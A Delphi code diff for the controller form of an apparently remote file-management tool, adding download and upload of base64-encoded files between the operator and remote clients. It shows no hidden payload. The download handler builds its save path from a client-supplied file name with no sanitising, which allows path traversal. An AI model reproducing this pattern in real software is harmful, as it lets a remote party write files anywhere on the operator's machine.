@@ -5,7 +5,7 @@ interface
 uses
   Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
   Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls, Vcl.ExtCtrls,
-  Vcl.Menus, System.JSON, ncLines, System.UITypes;
+  Vcl.Menus, System.JSON, ncLines, System.UITypes, System.NetEncoding, System.IOUtils;
 
 type
   TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
@@ -203,6 +203,34 @@ begin
   else if SameText(Action, 'log') then
   begin
     StatusBar1.SimpleText := JSONObj.Values['message'].Value;
+  end
+  else if SameText(Action, 'download') then
+  begin
+    var FileName := JSONObj.Values['name'].Value;
+    var Base64Data := JSONObj.Values['data'].Value;
+    var RawData: TBytes;
+    var SavePath: string;
+
+    RawData := TNetEncoding.Base64.Decode(TEncoding.UTF8.GetBytes(Base64Data));
+    SavePath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'clients');
+    SavePath := TPath.Combine(SavePath, FClientID);
+    SavePath := TPath.Combine(SavePath, 'recovery_files');
+
+    if not TDirectory.Exists(SavePath) then
+      TDirectory.CreateDirectory(SavePath);
+
+    SavePath := TPath.Combine(SavePath, FileName);
+
+    var MS := TMemoryStream.Create;
+    try
+      if Length(RawData) > 0 then
+        MS.WriteBuffer(RawData[0], Length(RawData));
+      MS.SaveToFile(SavePath);
+    finally
+      MS.Free;
+    end;
+
+    StatusBar1.SimpleText := 'Downloaded to: ' + FileName;
   end;
 end;
 
@@ -210,7 +238,7 @@ procedure TForm9.GeriClick(Sender: TObject);
 var
   P: string;
 begin
-  if (FCurrentPath = '') then
+  if (FCurrentPath = '') or (Length(FCurrentPath) <= 3) then
   begin
     RequestDrives;
     Exit;
@@ -219,7 +247,7 @@ begin
   P := ExcludeTrailingPathDelimiter(FCurrentPath);
   P := ExtractFilePath(P);
 
-  if (P = '') then
+  if (P = '') or (Length(P) < 2) then
     RequestDrives
   else
     RequestDirectory(P);
@@ -419,10 +447,34 @@ end;
 procedure TForm9.Upload1Click(Sender: TObject);
 var
   JSONObj: TJSONObject;
+  OpenDlg: TOpenDialog;
+  FileBytes: TBytes;
+  Base64Str: string;
 begin
-  // Upload logic would typically involve a FileOpenDialog and Base64 encoding
-  // For now, we'll just log that the user clicked it, as requested
-  StatusBar1.SimpleText := 'Upload initiated... (Feature to be completed with client-side)';
+  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
+
+  OpenDlg := TOpenDialog.Create(nil);
+  try
+    if OpenDlg.Execute then
+    begin
+      FileBytes := TFile.ReadAllBytes(OpenDlg.FileName);
+      Base64Str := TNetEncoding.Base64.EncodeBytesToString(FileBytes);
+      Base64Str := Base64Str.Replace(#13, '').Replace(#10, '');
+
+      JSONObj := TJSONObject.Create;
+      try
+        JSONObj.AddPair('action', 'uploadfile');
+        JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + TPath.GetFileName(OpenDlg.FileName));
+        JSONObj.AddPair('data', Base64Str);
+        FOnSendJSON(FLine, JSONObj);
+        StatusBar1.SimpleText := 'Uploading: ' + TPath.GetFileName(OpenDlg.FileName);
+      finally
+        JSONObj.Free;
+      end;
+    end;
+  finally
+    OpenDlg.Free;
+  end;
 end;
 
 end.
